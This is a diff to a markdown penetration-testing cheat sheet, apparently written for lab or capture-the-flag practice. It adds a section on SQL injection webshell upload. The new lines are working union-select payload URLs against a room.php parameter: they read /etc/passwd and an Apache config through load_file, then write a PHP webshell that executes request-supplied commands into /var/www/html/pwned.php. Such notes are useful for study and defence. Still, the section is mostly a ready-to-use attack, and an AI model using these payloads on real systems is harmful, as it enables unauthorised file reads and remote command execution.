@@ -65,6 +65,17 @@
 #### 3) Essentially, we brute-force the database to give us an answer if the letter/number exists (hence the boolean-based SQLi) based on the function/database content (users/passwords) it contains.
 
 
+## SQL Injection Webshell Upload
+
+### Requirements: User has write access to the server via SQL injection
+
+#### 1) http://TARGET_IP/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 (Check for read access)
+
+#### 2) http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7 (Check for write access)
+
+
+#### 3) http://TARGET_IP/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' (Upload the webshell)
+
 ## MySQL
 
 | **Command**   | **Description**   |
